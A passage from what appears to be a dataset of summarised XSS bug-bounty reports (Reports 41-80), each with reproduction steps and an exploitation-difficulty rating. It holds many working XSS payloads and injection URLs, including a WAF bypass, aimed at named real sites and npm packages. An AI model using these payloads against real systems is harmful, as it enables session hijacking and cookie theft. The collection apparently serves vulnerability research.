+This is a straightforward reflected XSS vulnerability that doesn't require complex application state manipulation or understanding of subtle component interactions. The attack vector is simple (URL parameter manipulation) and the vulnerability follows common XSS patterns without requiring novel exploitation techniques.
+
+--------------------------------------------------------------------------------
+
+Report 41: [simplehttpserver] Stored XSS in file names leads to malicious JavaScript code execution when directory listing is output in HTML
+================================================================================
+Vulnerability Description:
+The vulnerability is a stored Cross-Site Scripting (XSS) in the simplehttpserver module, where file names are directly embedded into HTML without sanitization. This allows an attacker to execute arbitrary JavaScript code when a user clicks on a maliciously named file in the directory listing.
+
+Steps to Reproduce:
+1. Create a file with a name containing malicious JavaScript code (e.g., 'javascript:alert("You are pwned!")' in the directory served by simplehttpserver.
+2. Run simplehttpserver in the directory and access the served page via a browser. Clicking the malicious file name will execute the JavaScript code.
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common XSS pattern where user input (file names) is directly embedded into HTML without sanitization. The attack does not require complex interactions or understanding of multiple components.
+
+--------------------------------------------------------------------------------
+
+Report 42: [crud-file-server] Stored XSS in filenames when directory index is served by crud-file-server
+================================================================================
+Vulnerability Description:
+The crud-file-server package is vulnerable to stored XSS via filenames due to lack of HTML sanitization when displaying directory listings. Malicious JavaScript can be executed by creating files with specially crafted names containing HTML/JS payloads.
+
+Steps to Reproduce:
+1. Install crud-file-server using npm: `npm install crud-file-server`
+2. Create a file with a malicious filename in the served directory: `"><iframe src="malware_frame.html">`
+3. Create a second file named `malware_frame.html` with malicious JavaScript content
+4. Run the crud-file-server in the directory containing the malicious files: `./node_modules/crud-file-server/bin/crud-file-server -f ./ -p 8080`
+5. Access the server via browser at `http://127.0.0.1:8080` to trigger the XSS
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it follows common XSS patterns in file listing scenarios. The attack requires only basic knowledge of XSS payloads and observing unsanitized output in directory listings.
+
+--------------------------------------------------------------------------------
+
+Report 43: [bracket-template] Reflected XSS possible when variable passed via GET parameter is used in template
+================================================================================
+Vulnerability Description:
+The bracket-template module is vulnerable to Reflected XSS when variables passed via GET parameters are used directly in templates without proper sanitization. This allows an attacker to inject arbitrary JavaScript code that executes in the context of the victim's browser.
+
+Steps to Reproduce:
+1. Install the bracket-template module: npm install bracket-template
+2. Create a sample application that reads a name from the URL and displays a welcome message without sanitizing the input
+3. Run the application: node app.js
+4. Access the application in a browser with a malicious payload in the URL parameter, e.g., http://localhost:8080?name=bl4de\x3cscript\x3econsole.log(\x22XSS\x22)\x3c/script\x3e
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common XSS pattern where unsanitized user input is directly embedded into the template. The attack does not require complex interactions or state manipulation, and the payload is a standard XSS vector.
+
+--------------------------------------------------------------------------------
+
+Report 44: Html injection mycrypto.com
+================================================================================
+Vulnerability Description:
+The vulnerability is an HTML injection in a pop-up message on mycrypto.com, which allows an attacker to inject arbitrary HTML content, including links and images. While JavaScript execution is filtered, the injection could potentially be used for phishing attacks by embedding malicious links.
+
+Steps to Reproduce:
+1. Navigate to the URL: https://mycrypto.com/?txHash=qwqwq%3C%20SRC=%22jav ascript:alert(0);"> <a href="https://securityz.net"><img src="https://securityz.net/mycrypto.jpeg"></a>qwqw#check-tx-status
+2. Observe the HTML injection in the pop-up message where the injected content (image with href) is displayed
+Exploitation Difficulty:
+The attack is straightforward, involving only the injection of HTML content into a URL parameter. It does not require complex interactions between components or manipulation of application states. The vulnerability is a basic HTML injection, which is a common and well-known issue.
+
+--------------------------------------------------------------------------------
+
+Report 45: Stored xss in shop name @ lp.reverb.com
+================================================================================
+Vulnerability Description:
+A stored XSS vulnerability exists in the shop name field at lp.reverb.com, allowing attackers to inject and persist malicious JavaScript code that executes when other users view the affected shop page.
+
+Steps to Reproduce:
+1. Navigate to https://reverb.com/my/lp_shop/edit
+2. Change your LP shop name to: lll"></script><script>alert('xss')</script> and save the changes
+3. View your LP shop at https://lp.reverb.com/shops/faniyos-boutique/listings to observe the XSS execution
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a basic XSS payload in a single input field without requiring complex application state manipulation or understanding of subtle interactions between components. The attack follows a common XSS pattern with no novel or application-specific logic required.
+
+--------------------------------------------------------------------------------
+
+Report 46: [html-pages] Stored XSS in the filename when directories listing
+================================================================================
+Vulnerability Description:
+The vulnerability is a Stored Cross-Site Scripting (XSS) in the html-pages module, where malicious JavaScript code can be executed in the user's browser by creating a directory with a specially crafted name. The lack of path sanitization allows the script to be injected into the HTML output, specifically in the title and breadcrumb sections of the directory listing page.
+
+Steps to Reproduce:
+1. Install the module: $ npm install html-pages
+2. Create a directory with a malicious name: '><svg onload=alert(5);>'
+3. Start the server: $ ./node_modules/html-pages/bin/index.js -p 6060
+4. Access the directory via browser: http://127.0.0.1:6060/%22%3E%3Csvg%20onload=alert(5);%3E/
+Exploitation Difficulty:
+The attack is straightforward and does not involve multiple components or complex interactions. The vulnerability arises from a basic lack of input sanitization, a common issue in web applications. The steps to reproduce are simple and do not require any advanced knowledge or manipulation of application states.
+
+--------------------------------------------------------------------------------
+
+Report 47: [cloudcmd] Stored XSS in the filename when directories listing
+================================================================================
+Vulnerability Description:
+A Stored XSS vulnerability exists in the cloudcmd module, where a malicious filename containing JavaScript code can be executed in the user's browser when the directory listing is viewed.
+
+Steps to Reproduce:
+1. Install the module: `npm i cloudcmd`
+2. Run the module: `./node_modules/cloudcmd/bin/cloudcmd.js --root .`
+3. Create a file with a malicious name: `touch '"><svg onload=alert(3);>'`
+4. Access the web interface at http://127.0.0.1:8080/ to trigger the XSS
+Exploitation Difficulty:
+The vulnerability involves a straightforward exploitation of filename handling in a web file manager, without requiring complex interactions or novel logic. The steps to reproduce are simple and do not involve multiple components or subtle interactions.
+
+--------------------------------------------------------------------------------
+
+Report 48: The react-marked-markdown module allows XSS injection in href values.
+================================================================================
+Vulnerability Description:
+The react-marked-markdown module incorrectly sanitizes href values in markdown links, allowing arbitrary JavaScript code execution (XSS) even when the sanitize option is enabled. This occurs because the module overwrites the link rendering method without properly escaping href attributes.
+
+Steps to Reproduce:
+1. Install the react-marked-markdown module (version 1.4.6) in a React project.
+2. Use the MarkdownPreview component with the markedOptions.sanitize set to true and pass a malicious markdown string containing a JavaScript URI in a link, e.g., '[XSS](javascript: alert1)'.
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common XSS pattern (JavaScript URIs in links) and the issue manifests with basic usage of the library. The only non-obvious aspect is that it persists despite the sanitize flag being set, but this is easily verifiable.
+
+--------------------------------------------------------------------------------
+
+Report 49: DOMXSS in redirect param
+================================================================================
+Vulnerability Description:
+The redirect parameter in the URL can be manipulated to include a JavaScript URL, leading to DOM-based XSS. When a victim visits a maliciously crafted URL and logs in, the attacker can execute arbitrary JavaScript in the context of the victim's session, potentially performing actions on their behalf.
+
+Steps to Reproduce:
+1. Logout from the application
+2. Visit the URL: https://lgtm-com.pentesting.semmle.net/?redirect=javascript:prompt(document.domain)%2f%2f
+3. Log in through email
+Exploitation Difficulty:
+The vulnerability involves a straightforward manipulation of a URL parameter to inject JavaScript, which is a common and well-documented attack vector. The steps to reproduce are simple and do not require complex interactions or understanding of intricate application states.
+
+--------------------------------------------------------------------------------
+
+Report 50: stored xss in scrape-metadata when reading metadata from an html page
+================================================================================
+Vulnerability Description:
+The scrape-metadata module does not sanitize metadata content fetched from HTML files, allowing for stored XSS when the output is rendered directly in HTML.
+
+Steps to Reproduce:
+1. Create an HTML file with malicious JavaScript in the 'og:title' meta tag and host it on a server.
+2. Use the scrape-metadata module to fetch and display the metadata from the malicious HTML file without sanitization.
+Exploitation Difficulty:
+The vulnerability involves a straightforward exploitation of missing sanitization in a common web scraping scenario, without complex interactions or state manipulations.
+
+--------------------------------------------------------------------------------
+
+Report 51: Stored XSS on Issue details page
+================================================================================
+Vulnerability Description:
+The issue detail page in GitLab is vulnerable to Stored XSS via the issue submission or editing functionality. An attacker can inject malicious JavaScript code in the issue description, which executes when the issue is viewed.
+
+Steps to Reproduce:
+1. Sign in to GitLab.
+2. Click the '[+]' icon and select 'New Project'.
+3. Fill out 'Project name' with 'PoC' and check 'Public'.
+4. Navigate to 'Issues' and click 'New issue'.
+5. Enter 'PoC' as the title and '![xss" onload=alert(1);//](a)' as the description.
+6. Click 'Submit issue'.
+7. Alternatively, edit an existing issue with the same XSS payload in the description.
+Exploitation Difficulty:
+The vulnerability involves a straightforward XSS injection in a text field, a common and well-documented attack vector. The steps to reproduce are simple and do not require complex interactions or state manipulation.
+
+--------------------------------------------------------------------------------
+
+Report 52: [mysupport.informatica.com] - reflected XSS
+================================================================================
+Vulnerability Description:
+The mysupport.informatica.com website is vulnerable to reflected Cross-Site Scripting (XSS) where malicious scripts can be injected via the search parameter (q) in the URL. The vulnerability allows execution of arbitrary JavaScript code in the context of the victim's session.
+
+Steps to Reproduce:
+1. Navigate to the URL: https://mysupport.informatica.com/search.jspa?q=zzz%3C%2Fscript%3E%3Cscript%3Econfirm%28document.domain%29%3B%3C%2Fscript%3E in Firefox 34.0.5
+2. Observe the JavaScript confirmation dialog displaying the document.domain, indicating successful execution of the injected script
+Exploitation Difficulty:
+This is a straightforward reflected XSS vulnerability that requires no complex interactions or state manipulation. The attack vector is simple URL parameter injection with a basic JavaScript payload, which is a well-known and commonly tested vulnerability pattern.
+
+--------------------------------------------------------------------------------
+
+Report 53: Stored XSS on activity
+================================================================================
+Vulnerability Description:
+A stored XSS vulnerability in the activityDescription field allows a member to inject malicious JavaScript, which executes when an admin views the activity log. This can lead to cookie theft and account takeover.
+
+Steps to Reproduce:
+1. Create a store
+2. Add a member to the store
+3. Change the member's name to a malicious payload: hunter"><svg/onload=alert(2)>
+4. Log in to the admin account and make changes to trigger the activity with the malicious payload
+Exploitation Difficulty:
+The vulnerability involves a straightforward XSS injection in a user-controllable field (member name) that is reflected in the admin interface. The attack does not require complex interactions or deep understanding of the application's logic.
+
+--------------------------------------------------------------------------------
+
+Report 54: DOM XSS on 50x.html page
+================================================================================
+Vulnerability Description:
+This is a DOM-based XSS vulnerability in the 50x.html page of DuckDuckGo. The vulnerability arises from the insecure handling of the 'location.search' source, which is directly used to set the 'innerHTML' of a DIV element without proper sanitization, allowing JavaScript execution.
+
+Steps to Reproduce:
+1. Navigate to the URL: https://duckduckgo.com/50x.html?e=&atb=test%22/%3E%3Cimg%20src=x%20onerror=alert(document.domain);%3E
+2. Observe the execution of JavaScript code via the injected payload in the URL parameter.
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a direct injection into a DOM sink (innerHTML) from a well-known source (location.search). The attack does not require complex interactions or state manipulation, and the exploitation follows a common pattern for DOM XSS vulnerabilities.
+
+--------------------------------------------------------------------------------
+
+Report 55: Stored XSS in merge request pages
+================================================================================
+Vulnerability Description:
+A Stored XSS vulnerability exists in merge request pages via the parameter merge_request[source_branch] of the request to create a New Merge Request. By injecting a malicious payload into this parameter, an attacker can execute arbitrary JavaScript code in the context of the victim's browser when the merge request page is viewed.
+
+Steps to Reproduce:
+1. Sign in to GitLab.
+2. Click the "[+]" icon.
+3. Click "New Project".
+4. Fill out "Project name" form with "test-project".
+5. Check the radio button of "Public".
+6. Check the "Initialize repository with a README".
+7. Click "Create project" button.
+8. Go to "http(s)://{GitLab host}/{user id}/test-project/branches/new".
+9. Fill out each form as follows: Branch name: test-branch, Create from: master.
+10. Click "Create branch" button.
+11. Go to "http://{GitLab host}/{user id}/test-project/merge_requests".
+12. Click "Create merge request" button.
+13. Click "Submit merge request" button.
+14. Intercept the request.
+15. Change the merge_request[source_branch] parameter's value to <img/src=x onerror=alert(1)>.
+16. Send the request.
+Exploitation Difficulty:
+The attack involves multiple steps to set up the environment (creating a project, branch, and merge request), but the XSS payload injection itself is straightforward once the request is intercepted. The interaction between the components is not particularly subtle or complex, and the vulnerability follows a common pattern of parameter manipulation for XSS.
+
+--------------------------------------------------------------------------------
+
+Report 56: Stored xss in address field in billing activity at https://shop.aaf.com/Order/step1/index.cfm
+================================================================================
+Vulnerability Description:
+The address field in the billing activity at https://shop.aaf.com/Order/step1/index.cfm is vulnerable to stored XSS. This allows an attacker to inject malicious scripts that can execute in the context of other users, potentially leading to cookie theft and account takeover.
+
+Steps to Reproduce:
+1. Go to https://shop.aaf.com and click on any product (e.g., a t-shirt).
+2. Add the product to the cart and click on 'Proceed'.
+3. Enter the XSS payload (e.g., `a"><svg/onload=prompt(1)>`) in every address field.
+4. Click on 'OK' or 'Proceed' to trigger the XSS popup.
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common XSS payload in a standard input field. The attack does not require multiple components, complex state manipulation, or novel logic. It follows a typical XSS exploitation pattern.
+
+--------------------------------------------------------------------------------
+
+Report 57: Stored Cross Site Scripting.
+================================================================================
+Vulnerability Description:
+This is a Stored Cross-Site Scripting (XSS) vulnerability where a malicious script is permanently stored on the target server (e.g., in a user profile field) and executed when the victim accesses the affected page. The attack requires no user interaction beyond normal browsing.
+
+Steps to Reproduce:
+1. Go to https://www.easycontactnow.com/ and click 'Try For Free' to sign up.
+2. Enter a malicious payload (e.g., "><script>alert(1)</script>) in the 'Full Name' field and complete the registration.
+3. Confirm your account, log in, and navigate to the dashboard or other pages to trigger the XSS payload.
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common XSS payload in a user-input field (Full Name) without any complex interactions, state manipulation, or novel logic. The steps are simple and follow a typical XSS testing approach.
+
+--------------------------------------------------------------------------------
+
+Report 58: Stored xss
+================================================================================
+Vulnerability Description:
+This is a stored XSS vulnerability in Shopify's admin interface where the WAF filters HTML tags but can be bypassed by inserting a specific HTML comment (<!-->) before the tags. This allows an attacker to execute arbitrary JavaScript in the context of the admin dashboard.
+
+Steps to Reproduce:
+1. Open your store account
+2. Navigate to https://xxx.myshopify.com/admin/settings/general
+3. Put your street address xss payload (xss"><!--><svg/onload=alert(document.domain)>)
+4. Go to https://xxx.myshopify.com/admin/dashboards/live
+5. XSS alert message
+Exploitation Difficulty:
+The vulnerability involves a simple bypass technique (HTML comment) to evade WAF filtering, which is a known method in XSS attacks. The steps to reproduce are straightforward and do not require complex interactions or state manipulation.
+
+--------------------------------------------------------------------------------
+
+Report 59: Reflected XSS on $Any$.myshopify.com/admin
+================================================================================
+Vulnerability Description:
+A reflected cross-site scripting (XSS) vulnerability exists in the 'return_url' parameter of <any>.myshopify.com/admin. By injecting a malicious JavaScript payload via the 'return_url' parameter, an attacker can execute arbitrary JavaScript code in the context of the admin interface when the victim reloads the page.
+
+Steps to Reproduce:
+1. Go to https://<Any>.myshopify.com/admin/authenticate?return_url=javascript:alert(100)//
+2. Click on 'reload this page' to trigger the XSS alert
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a simple reflected XSS via a URL parameter, which is a common and well-documented vulnerability pattern. The attack does not require multiple components, complex state manipulation, or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report 60: [careers.informatica.com] Cross Site Script Vulnerability on informatica
+================================================================================
+Vulnerability Description:
+The vulnerability is a Cross-Site Scripting (XSS) issue on the Informatica careers page. The search bar on the Carriers page does not properly sanitize user input, allowing JavaScript code to be executed when a malicious payload is entered into the 'All Location' search field.
+
+Steps to Reproduce:
+1. Open the Carriers page of Informatica and search for anything.
+2. On the search result page, use the 'All Location' field to search with the JavaScript payload: '><svg/onload=prompt(1);>.
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common XSS payload in a standard input field without any complex interactions or state manipulations required. The steps to reproduce are simple and do not require deep understanding of the application's logic or state.
+
+--------------------------------------------------------------------------------
+
+Report 61: Stored XSS in infogram.com via language 
+================================================================================
+Vulnerability Description:
+A stored XSS vulnerability exists in infogram.com via the language profile parameter. An attacker can inject malicious JavaScript code that executes when a victim views the attacker's public profile.
+
+Steps to Reproduce:
+1. Send a PUT request to `/api/users/me` with a malicious payload in the `language` parameter (e.g., `></script><img src=x onerror=alert(document.domain)>;//`).
+2. Visit the public profile page (e.g., `https://infogram.com/dd_ddt7`) to trigger the XSS payload.
+Exploitation Difficulty:
+The vulnerability involves a straightforward injection into a user-controllable parameter (`language`), and the payload execution is triggered by visiting a predictable public profile URL. No complex interactions or state manipulations are required.
+
+--------------------------------------------------------------------------------
+
+Report 62: Stored XSS on reports.
+================================================================================
+Vulnerability Description:
+Stored XSS can be submitted on reports, and anyone who checks the report will trigger the XSS. This allows an attacker to steal data from whoever checks the report.
+
+Steps to Reproduce:
+1. Go to https://app.mopub.com/reports/custom/
+2. Click New network report
+3. On the name, enter payload: "><img src=x onerror=alert(document.domain)>
+4. Click Run and save then XSS will trigger
+Exploitation Difficulty:
+The attack involves a straightforward injection of a common XSS payload into a form field. No complex interactions or state manipulations are required, and the payload is a well-known XSS vector.
+
+--------------------------------------------------------------------------------
+
+Report 63: [fileview] Inadequate Output Encoding and Escaping 
+================================================================================
+Vulnerability Description:
+The fileview module suffers from a stored XSS vulnerability due to inadequate output encoding and escaping of filenames. An attacker can embed malicious JavaScript code in a filename, which gets executed when a victim browses the file via the web interface.
+
+Steps to Reproduce:
+1. Install fileview: npm install fileview -g
+2. Create a file with XSS payload: "><img src=x onerror=alert("xss")>.jpg
+3. Start the file server: fileview -p /root/ -P 8080
+4. Access http://127.0.0.1:8080/ to observe XSS execution
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common XSS attack vector (filename manipulation) and does not require complex interactions or state manipulations. The attack is simple and follows a predictable pattern of testing for lack of input sanitization.
+
+--------------------------------------------------------------------------------
+
+Report 64: [file-browser] Inadequate Output Encoding and Escaping 
+================================================================================
+Vulnerability Description:
+The file-browser module suffers from a stored XSS vulnerability due to improper output encoding and escaping. An attacker can embed malicious JavaScript code in filenames, which gets executed when the file is browsed via the web interface.
+
+Steps to Reproduce:
+1. Install file-browser globally: `npm -g install file-browser`
+2. Start the file server: `file-browser`
+3. Create a file with an XSS payload as the filename: `touch '"><img src=x onerror=alert("xss")>.jpg'`
+4. Access the file server URL in a browser: `http://127.0.0.1:8088/lib/template.html`
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common XSS pattern (filename manipulation) in a simple file server application. The attack does not require complex interactions or state manipulation.
+
+--------------------------------------------------------------------------------
+
+Report 65: DOM Based XSS via postMessage at https://inventory.upserve.com/login/
+================================================================================
+Vulnerability Description:
+DOM based XSS is possible at https://inventory.upserve.com/login/ due to insecure origin checking when receiving a postMessage. The origin check only verifies if 'https://hq.upserve.com' is present anywhere in the origin string, allowing malicious origins like 'https://hq.upserve.com.mydomain.com' to pass the check. This can lead to execution of arbitrary JavaScript in the context of the login page, potentially stealing credentials.
+
+Steps to Reproduce:
+1. Visit https://hq.upserve.com.████████/upserve_xss.html
+2. Click the link to trigger the postMessage to https://inventory.upserve.com
+Exploitation Difficulty:
+The vulnerability involves understanding postMessage communication and origin validation. While the origin check flaw is subtle, the overall attack chain is straightforward once the insecure origin check is identified. The components (postMessage handler, origin check, eval) are common in web applications.
+
+--------------------------------------------------------------------------------
+
+Report 66: Stored XSS Vulnerability
+================================================================================
+Vulnerability Description:
+A stored XSS vulnerability exists in the WordPress Trac system, allowing an attacker to inject malicious JavaScript code into a ticket. When another user views the ticket, the script executes, potentially leading to cookie theft or other malicious actions.
+
+Steps to Reproduce:
+1. Go to https://core.trac.wordpress.org/ and login (use a private window with a different account).
+2. Navigate to https://core.trac.wordpress.org/newticket and fill in the summary and description fields.
+3. Select a Workflow Keyword, choose 'manual', and paste the payload: "><svg/onload=alert(document.domain)>".
+4. Click 'Create Ticket' to trigger the XSS alert. Copy the URL and open it in another private window to confirm the vulnerability.
+Exploitation Difficulty:
+The vulnerability involves a straightforward injection of a common XSS payload into a ticket field. The steps are simple and do not require complex interactions or understanding of subtle application behaviors. The payload used is a well-known XSS vector.
+
+--------------------------------------------------------------------------------
+
+Report 67: Stored XSS in "Create Groups"
+================================================================================
+Vulnerability Description:
+Stored XSS vulnerability in the 'Create Groups' feature of GitLab, where malicious JavaScript code is permanently stored and executed when a victim interacts with the affected group (e.g., by clicking 'NEW PROJECT'). This can lead to cookie theft, session hijacking, or arbitrary JavaScript execution.
+
+Steps to Reproduce:
+1. Login to Gitlab
+2. Create a new group with XSS payload: "><img src=x onerror=prompt(123)>
+3. Open the newly created group
+4. Click 'NEW PROJECT' to trigger the XSS
+Exploitation Difficulty:
+The vulnerability requires only basic XSS knowledge and straightforward steps to reproduce (input a standard XSS payload in a group name field). No complex application states or multi-component interactions are involved.
+
+--------------------------------------------------------------------------------
+
+Report 68: Reflected XSS on https://make.wordpress.org via 'channel' parameter
+================================================================================
+Vulnerability Description:
+A reflected XSS vulnerability exists on the make.wordpress.org domain via the 'channel' parameter. The vulnerability allows an attacker to inject malicious JavaScript code that gets executed in the context of the victim's browser session.
+
+Steps to Reproduce:
+1. Visit the URL: https://make.wordpress.org/chat/logs?channel=16%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E&date=2019-07-21&no_bots=1
+2. Observe the XSS pop-up displaying the document.domain
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a simple injection of a malicious payload into a URL parameter, which is a common and well-documented attack vector. The attack does not require multiple components, complex state manipulation, or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report 69: Stored XSS for Grafana dashboard URL
+================================================================================
+Vulnerability Description:
+A stored XSS vulnerability exists in the Grafana dashboard URL input field within the admin interface. The vulnerability allows an administrator to inject arbitrary JavaScript code, which is then executed when another administrator accesses the Metrics Dashboard. This can lead to session hijacking or CSRF token theft due to the window.opener property being accessible from the new tab.
+
+Steps to Reproduce:
+1. As an administrator, navigate to the Grafana settings page: http://example.gitlab.com/admin/application_settings/metrics_and_profiling#js-grafana-settings
+2. Enter a malicious JavaScript payload in the URL field, e.g., javascript:alert(window.opener.document.location)
+3. Navigate to Monitoring -> Metrics Dashboard to trigger the payload execution
+Exploitation Difficulty:
+The vulnerability involves understanding the interaction between URL validation, the target="_blank" attribute behavior, and the window.opener property. While the components are not overly complex, recognizing the potential for abuse through window.opener in this context requires some insight into browser security behaviors.
+
+--------------------------------------------------------------------------------
+
+Report 70: Reflective Cross-site Scripting via Newsletter Form
+================================================================================
+Vulnerability Description:
+The vulnerability is a reflective cross-site scripting (XSS) issue in the newsletter form of a Shopify store. It allows an attacker to inject malicious JavaScript code that executes when the page loads, without requiring any user interaction. This can be exploited to compromise administrative sessions or perform actions on behalf of users.
+
+Steps to Reproduce:
+1. Navigate to the vulnerable URL: https://testbuguser.myshopify.com/?contact[email]%20onfocus%3djavascript:alert(%27xss%27)%20autofocus%20a=a&form_type[a]aaa
+2. Observe the execution of the JavaScript alert when the page loads, indicating the presence of the XSS vulnerability.
+Exploitation Difficulty:
+The vulnerability involves a straightforward injection of JavaScript code into a URL parameter, which is a common and well-documented attack vector. The discovery does not require understanding complex application states or novel logic, making it relatively easy to identify.
+
+--------------------------------------------------------------------------------
+
+Report 71: Reflected XSS 
+================================================================================
+Vulnerability Description:
+The vulnerability is a reflected Cross-Site Scripting (XSS) issue where user input in the URL is not properly sanitized, allowing JavaScript code execution when the victim logs in.
+
+Steps to Reproduce:
+1. Go to https://bi.owox.com/ui/6177527534dc114eb07fa829e4ce4d28%3Cimg%20src=xss%20onerror=prompt('XSS')%3E/dashboard/?trial=activated
+2. Log in and XSS will execute
+Exploitation Difficulty:
+The attack is straightforward and does not involve multiple components, complex states, or novel logic. It simply requires injecting a malicious payload into the URL parameter, which is a common and well-documented XSS vector.
+
+--------------------------------------------------------------------------------
+
+Report 72: The URL in "Choose a data source'' at "https://bi.owox.com/ui/settings/connected-services/setup/" is not filtered => reflected XSS.
+================================================================================
+Vulnerability Description:
+The URL in 'Choose a data source' at 'https://bi.owox.com/ui/settings/connected-services/setup/' is not filtered, leading to a reflected XSS vulnerability. The attacker can inject malicious scripts via the URL, which are then executed when the victim logs in.
+
+Steps to Reproduce:
+1. Go to https://bi.owox.com/ui/callbacks/google-supervisors/analytics%3Cimg%20src=xss%20onerror=prompt(1)%3E/?state=d159b8264eef78b11afdd016531b128c
+2. Log in and XSS will execute
+Exploitation Difficulty:
+The vulnerability involves a straightforward reflected XSS attack where the payload is injected via a URL parameter. The attack does not require multiple components, complex application states, or novel logic. The interaction is direct and the vulnerability is common in web applications.
+
+--------------------------------------------------------------------------------
+
+Report 73: stored xss in https://www.smule.com
+================================================================================
+Vulnerability Description:
+A stored XSS vulnerability exists in the Blurb, Location, and Name fields of www.smule.com. An attacker can inject malicious JavaScript code into these fields, which is then permanently stored and executed when a victim views the affected page. This can lead to cookie theft, session hijacking, and disclosure of sensitive data.
+
+Steps to Reproduce:
+1. Login and go to settings
+2. Add payload to field Blurb
+3. Refresh page
+4. XSS will pop up
+Exploitation Difficulty:
+The vulnerability involves a straightforward injection of XSS payloads into user input fields without requiring complex interactions or state manipulation. The attack is simple and does not involve multiple components or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report 74: Stored XSS in wordpress.com
+================================================================================
+Vulnerability Description:
+Stored XSS vulnerability in WordPress.com allows an attacker to inject malicious JavaScript code via comments or posts, which executes in the context of the victim's session when viewed, potentially leading to session hijacking or other malicious actions.
+
+Steps to Reproduce:
+1. Log in to wordpress.com
+2. Choose a post from the feeds
+3. Add a comment with the payload: <iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt;
+4. By clicking on 'Click Here', an alert will fire with cookies of the domain wordpress.com
+Exploitation Difficulty:
+The vulnerability involves a straightforward injection of a well-known XSS payload into comment or post fields, which is a common and well-documented attack vector. The steps to reproduce are simple and do not require complex interactions or state manipulations.
+
+--------------------------------------------------------------------------------
+
+Report 75: Stored XSS on Wordpress 5.3 via Title Post
+================================================================================
+Vulnerability Description:
+A Stored Cross-Site Scripting (XSS) vulnerability in WordPress 5.3 allows an attacker to inject malicious JavaScript code into the title of a post. When the post is viewed, the script executes in the context of the victim's browser, potentially allowing the attacker to steal cookies or perform other malicious actions.
+
+Steps to Reproduce:
+1. Login to the WordPress website
+2. Create a new post with a title containing the XSS payload, e.g., <script>alert(document.domain);</script>
+3. Publish the post and open it to trigger the XSS
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a simple injection of a common XSS payload into a visible field (post title) without any need for complex interactions or state manipulation. The attack does not require multiple components or novel logic, making it easy to identify and exploit.
+
+--------------------------------------------------------------------------------
+
+Report 76: Reflected cross-site scripting vulnerability on a DoD website
+================================================================================
+Vulnerability Description:
+This is a reflected cross-site scripting (XSS) vulnerability on a DoD website. The vulnerability allows an attacker to inject malicious scripts into the search functionality, which are then executed in the context of the user's browser. This can be used to steal cookies, modify web content, or perform other malicious actions.
+
+Steps to Reproduce:
+1. Navigate to the DoD website at *https://███/unit/███
+2. Enter the payload `<script>alert(document.domain)</script>` or `<script>alert(document.cookie)</script>` in the search engine and hit enter
+3. Scroll the mouse below the search term to the three icons and hover over them to trigger the pop-up alert
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a simple injection of common XSS payloads into a search field, which is a well-known and commonly tested attack vector. The attack does not require multiple components, complex application states, or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report 77: Stored-Xss at connect.topcoder.com/projects/ affected on project chat members
+================================================================================
+Vulnerability Description:
+A stored XSS vulnerability exists in the project chat feature of connect.topcoder.com. An attacker can inject malicious JavaScript code into a project message, which will execute when other users view the message. This could lead to session hijacking or account takeover if the malicious script steals cookies or CSRF tokens.
+
+Steps to Reproduce:
+1. Register on topcoder.com and log in to connect.topcoder.com using your SSO account.
+2. Create a new project at https://connect.topcoder.com/new-project/ and wait for administrator approval.
+3. Navigate to the project's messages section: https://connect.topcoder.com/projects/<your_project_id>/messages.
+4. Post a message with a random title and the content: <script>alert()</script>.
+5. Observe that the JavaScript code executes when another user views the message.
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a basic XSS payload in a text input field. The attack does not require complex interactions between components or manipulation of application states. The XSS vulnerability is a common issue and the payload used is standard for testing such vulnerabilities.
+
+--------------------------------------------------------------------------------
+
+Report 78: [now.informatica.com] Reflective Xss
+================================================================================
+Vulnerability Description:
+The vulnerability is a Reflective Cross-Site Scripting (XSS) issue found on the now.informatica.com website. By injecting a simple XSS vector into the URL parameters, an attacker can execute arbitrary JavaScript in the context of the victim's browser session, as demonstrated by the ability to confirm the document.domain.
+
+Steps to Reproduce:
+1. Navigate to the URL: http://now.informatica.com/en_data-integration-for-dummies_book_2642.html?source=Homepage
+2. Inject the XSS vector: <svg onload=confirm(document.domain)>xs into the URL parameters or input fields
+Exploitation Difficulty:
+The attack involves a straightforward injection of a common XSS payload into a URL parameter, which is a well-known and easily testable vulnerability. There are no complex interactions or state manipulations required, and the payload is a standard test vector for XSS vulnerabilities.
+
+--------------------------------------------------------------------------------
+
+Report 79: Unrestricted file upload leads to stored xss on https://████████/
+================================================================================
+Vulnerability Description:
+The vulnerability allows unrestricted file upload, leading to stored XSS. The web app does not validate the content-type of uploaded files, enabling users to upload malicious HTML files that execute JavaScript when opened.
+
+Steps to Reproduce:
+1. Create an account at https://██████/████████/app/registration/basic-info
+2. When connected, click on 'certification' and upload the provided xss.html file
+3. Go back to the 'certification tab' and open the attachment in a new tab
+Exploitation Difficulty:
+The attack is straightforward, involving basic file upload manipulation without complex interactions or state manipulation. The vulnerability is common and well-documented in web security.
+
+--------------------------------------------------------------------------------
+
+Report 80: Stored XSS on the job page
+================================================================================
+Vulnerability Description:
+A stored XSS vulnerability exists in the Kubernetes cluster configuration page of GitLab. By injecting malicious scripts into fields like cluster name, API URL, or Service Token, an attacker can execute arbitrary JavaScript in the context of other users who view the Kubernetes cluster configuration page. This can lead to session hijacking, data theft, or unauthorized actions.
+
+Steps to Reproduce:
